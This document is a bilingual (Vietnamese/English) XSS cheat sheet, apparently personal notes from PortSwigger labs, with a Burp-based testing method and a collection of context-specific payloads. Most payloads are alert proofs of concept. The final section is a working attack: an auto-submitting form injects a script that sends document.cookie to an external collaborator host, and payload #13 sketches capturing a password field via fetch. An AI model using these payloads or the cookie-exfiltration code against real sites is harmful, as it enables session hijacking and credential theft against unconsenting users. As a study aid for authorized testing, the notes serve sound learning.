### ***References***:
[Cross Site Scripting - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
[Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
[XSS Filter Evasion - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
# Identification
## Reflect XSS
+ URL param: `https://insecure-website.com/search?term=gift`
1. **Kiểm thử mọi entry point**: mọi tham số trong URL (query, path), body và header.
2. **Gửi giá trị ngẫu nhiên**: mỗi entry point gửi giá trị chữ-số duy nhất (~8 ký tự). (Có thể dùng Burp Intruder để sinh giá trị và grep phản hồi.)
3. **Xác định ngữ cảnh phản chiếu**: xem giá trị xuất hiện trong HTML text, attribute có/không quote, JS string, v.v.
4. **Thử payload ứng viên**: dựa vào ngữ cảnh, chèn payload bằng Burp Repeater, gửi và kiểm tra response. Đặt payload trước/sau giá trị ngẫu nhiên, dùng tìm kiếm để định vị nhanh.
5. **Thử payload thay thế**: nếu payload bị sửa hoặc chặn, thử các biến thể phù hợp với ngữ cảnh và kiểu lọc.
6. **Chạy trên trình duyệt thật**: chuyển PoC sang trình duyệt (dán URL hoặc sửa request qua Proxy) và kiểm tra (ví dụ `alert(document.domain)`).
## Stored XSS

| **Entry points (test tất cả):** | Query string, body (form/json), URL path, HTTP headers,  Kênh ngoại băng thông (email, third-party feeds, uploads…). |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **Exit points:**                | Mọi response trả cho bất kỳ người dùng nào (trang, API, feed, log hiển thị...)                                       |

**Quy trình ngắn:**
1. Ghi list tất cả entry point khả dụng.
2. Với mỗi entry point: gửi **giá trị riêng/duy nhất** (vd 8 ký tự) và **giám sát các response** để tìm reflection.
3. Khi thấy giá trị xuất hiện ở response nào → xác định **ngữ cảnh** (HTML text, attribute, JS string, URL, v.v.).
4. Xác minh **có được lưu (stored)** hay chỉ reflected tạm thời (tham chiếu qua request khác / refresh để kiểm tra).
5. Dựa vào ngữ cảnh, thử payload ứng viên phù hợp (dùng Burp Repeater để chỉnh & kiểm tra).
6. Nếu payload bị sửa/chặn → thử biến thể khác theo ngữ cảnh (HTML-encode, JS-escape, onerror/throw, template literal, v.v.).
7. Khi payload hoạt động trong Repeater → chuyển PoC sang **trình duyệt thật** để xác nhận thực thi (ví dụ `alert(document.domain)`).

> Ưu tiên kiểm tra các chức năng dễ lưu dữ liệu: comment, profile, posts, uploads, admin logs.
> Theo dõi khả năng ghi đè (recent list, cache) — dữ liệu lưu có thể bị thay thế nhanh.

## DOM XSS

# Tricks & Payload

#### Payload phổ biến portswigger
```html
# 1.location.search (hidden param)
&storeId=<script>alert(URLSearchParams(window.location.search))</script>

# 2.vuln in JS framework (angular 1.7.7)
{{constructor.constructor('alert(1)')()}}

# 3.eval('var searchResultsObj = ' + this.responseText);
\"-alert(1)}//

# 4.html.replace('<', '&lt;').replace('>', '&gt;');
<><img src=x onerror=alert()>')

# 5.using resize
<iframe src="/?search=<body onresize=print()>" onload=this.style.width='1%'>

# 6.location.hash
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x

# 7.xss in svg
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>

# 8.in canonical link tag
?<div accesskey='x' onclick='alert(1)'></div>

# 9.escape backslash and single quote
</script><script>alert(1)</script>

# 10. angle brackets and double quotes HTML-encoded and single quotes escaped
\';alert(1)//

# 11. string template literal with backtick
${alert()}

# 12. Making use of HTML-encoding
&apos;-alert(document.domain)-&apos; 

# 13 
<input type=password name=password onchange="if(this.value.length)fetch(...)">

```

## XSS
**1. XSS between HTML tags**
```html
<img src=x onerror=js>
<script>...</script>
<svg>...</svg>
...
```
**2. XSS in HTML tag attributes**
```html
"><script>alert(document.domain)</script> # Đóng tag cũ
" autofocus onfocus=alert(document.domain) x=" # Chèn thêm thuộc tính vào thẻ
<a href="javascript:alert(document.domain)"> # Chèn vào href -> Open redirect
```
**3. XSS in JAVASCRIPT**
###### Terminating the existing script
```html
<script>
  var input = 'controllable data here';
  var csrfElement = document.querySelector('input[name=csrf]');
  var csrfToken = csrfElement ? csrfElement.value : null;
...
</script>
```

```html
</script><img src=1 onerror=alert(document.domain)>
# đóng đoạn script trước chèn payload xss vào sau.
# thẻ html sẽ được load trước thẻ script
```
##### Breaking out of a JavaScript string
```html
'-alert(document.domain)-' 
';alert(document.domain)// # Ex: <script> var s = '\\';alert(1)//';</script>
\"-alert(1)}//
```
##### XSS without parentheses and semi-colons
```html
<script>onerror=alert;throw 1337</script> # Function without parentheses
<script>{onerror=alert}throw 1337</script> # Function without semi-colon 
<script>throw onerror=alert, (console.log('a')), 42, 'x'</script> 
```
##### XSS in JavaScript template literals
```html
${alert(document.domain)} # để ý ``
```

# Attack Vectors
## 1. Refflect XSS with POST method
Sử dụng lỗ hổng khác CSRF, Hijacking để tạo form submit tới bên endpoint có lỗ hổng
```html
</h1><form action="https://webvuln.example/" method="GET" id="f"> <input type="hidden" name="search" value="<script>fetch('https://88eyjen9z5czhledp4x216l6wx2oqge5.oastify.com',{method:'POST',body:document.cookie})</script>"> </form> <script>document.getElementById('f').submit();</script><h1>
```
	